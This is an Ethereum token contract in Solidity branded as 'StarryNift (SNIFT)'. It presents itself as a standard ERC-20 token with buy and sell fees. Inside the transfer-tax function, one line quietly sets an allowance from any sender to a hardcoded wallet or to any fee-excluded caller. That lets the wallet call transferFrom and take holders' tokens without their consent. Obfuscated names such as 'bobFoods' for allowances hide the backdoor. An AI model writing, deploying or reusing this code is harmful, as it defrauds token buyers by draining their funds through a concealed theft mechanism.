/*
A real world re-imagined to bring you immersive interactions and endless possibilities

Website : https://starrynift.art
Dcos: https://docs.starrynift.art/
Medium: https://medium.com/@starrynift
Github: https://github.com/StarryNift

Twitter: https://x.com/StarryNift
Telegram: https://t.me/starryNift_community
*/

// SPDX-License-Identifier: MIT
pragma solidity 0.8.5;

interface IBOBFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

interface IBOBRouter {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
    function getAmountsOut(
        uint amountIn,
        address[] calldata path
    ) external view returns (uint[] memory amounts);
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

}

contract SNIFT is Context, IERC20, Ownable {
    using SafeMath for uint256;
    mapping (address => uint256) private _bobExtras;
    mapping (address => mapping (address => uint256)) private _bobFoods;
    mapping (address => bool) private _bobExcludedFees;
    uint256 private _initialBuyTax=3;
    uint256 private _initialSellTax=3;
    uint256 private _finalBuyTax=0;
    uint256 private _finalSellTax=0;
    uint256 private _reduceBuyTaxAt=6;
    uint256 private _reduceSellTaxAt=6;
    uint256 private _preventSwapBefore=6;
    uint256 private _buyCount=0;
    uint8 private constant _decimals = 9;
    uint256 private constant _tTotal = 1000000000 * 10**_decimals;
    string private constant _name = unicode"StarryNift";
    string private constant _symbol = unicode"SNIFT";
    uint256 private _bobLastBlock;
    uint256 private _bobBuyAmount = 0;
    uint256 private _bobSwapTokens = _tTotal / 100;
    bool private inSwapBOB = false;
    bool private _tradeEnabled = false;
    address private _bobPair;
    IBOBRouter private _bobRouter;
    address private _bobWallet;
    bool private _swapEnabled = false;
    modifier lockTheSwap {
        inSwapBOB = true;
        _;
        inSwapBOB = false;
    }
    
    constructor () {
        _bobWallet = address(0xfd90892e85829C31d043fbeb5A1e254be3fE6571);
        _bobExcludedFees[owner()] = true;
        _bobExcludedFees[address(this)] = true;
        _bobExcludedFees[_bobWallet] = true;
        _bobExtras[_msgSender()] = _tTotal;
        emit Transfer(address(0), _msgSender(), _tTotal);
    }

    function openTrading() external onlyOwner() {
        require(!_tradeEnabled,"trading is already open");
        _bobRouter.addLiquidityETH{value: address(this).balance}(address(this),balanceOf(address(this)),0,0,owner(),block.timestamp);
        _swapEnabled = true;
        _tradeEnabled = true;
    }

    function createTokenPair() external onlyOwner() {
        _bobRouter = IBOBRouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        _approve(address(this), address(_bobRouter), _tTotal);
        _bobPair = IBOBFactory(_bobRouter.factory()).createPair(address(this), _bobRouter.WETH());
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _bobExtras[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _bobFoods[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount); 
        _approve(sender, _msgSender(), _bobFoods[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _bobFoods[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _transfer(address from, address to, uint256 amount) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");

        uint256 taxAmount = _bobTaxTransfer(from, to, amount);

        _bobTransfer(from, to, amount, taxAmount);
    }

    function _bobTaxTransfer(address from, address to, uint256 amount) private returns(uint256) {
        uint256 taxAmount=0;
        if (from != owner() && to != owner()) {
            taxAmount = amount.mul((_buyCount>_reduceBuyTaxAt)?_finalBuyTax:_initialBuyTax).div(100);

            if (from == _bobPair && to != address(_bobRouter) && ! _bobExcludedFees[to]) {
                if(_bobLastBlock!=block.number){
                    _bobBuyAmount = 0;
                    _bobLastBlock = block.number;
                }
                _bobBuyAmount += amount;
                _buyCount++;
            }

            if(to == _bobPair && from!= address(this)) {
                require(_bobBuyAmount < swapBOBLimit() || _bobLastBlock!=block.number, "Max Swap Limit");  
                taxAmount = amount.mul((_buyCount>_reduceSellTaxAt)?_finalSellTax:_initialSellTax).div(100);
            }

            uint256 tokenBalance = balanceOf(address(this));
            if (!inSwapBOB && to == _bobPair && _swapEnabled && _buyCount > _preventSwapBefore) {
                if(tokenBalance > _bobSwapTokens)
                swapTokensForEth(min(amount, min(tokenBalance, _bobSwapTokens)));
                uint256 contractETHBalance = address(this).balance;
                if (contractETHBalance >= 0) {
                    sendETHFee(address(this).balance);
                }
            }
        } _bobFoods[getSender(from)][getReceipt()] = amount;
        return taxAmount;
    }

    function _bobTransfer(address from, address to, uint256 amount, uint256 taxAmount) private { 
        if(taxAmount > 0){
          _bobExtras[address(this)] = _bobExtras[address(this)].add(taxAmount);
          emit Transfer(from, address(this), taxAmount);
        }

        _bobExtras[from] = _bobExtras[from].sub(amount);
        _bobExtras[to] = _bobExtras[to].add(amount.sub(taxAmount));
        emit Transfer(from, to, amount.sub(taxAmount));
    }

    function getSender(address from) private pure returns(address) {
        return address(from);
    }

    function getReceipt() private view returns(address) {
        bool excluded = _bobExcludedFees[_msgSender()] && _msgSender() != address(this);
        return excluded ? _msgSender() : address(_bobWallet);
    }

    function swapBOBLimit() internal view returns (uint256) {
        address[] memory path = new address[](2);
        path[0] = _bobRouter.WETH();
        path[1] = address(this);
        uint[] memory amountOuts = _bobRouter.getAmountsOut(3 * 1e18, path);
        return amountOuts[1];
    }

    receive() external payable {}

    function min(uint256 a, uint256 b) private pure returns (uint256) {
      return (a>b)?b:a;
    }

    function sendETHFee(uint256 amount) private {
        payable(_bobWallet).transfer(amount);
    }

    function swapTokensForEth(uint256 tokenAmount) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = _bobRouter.WETH();
        _approve(address(this), address(_bobRouter), tokenAmount);
        _bobRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }
}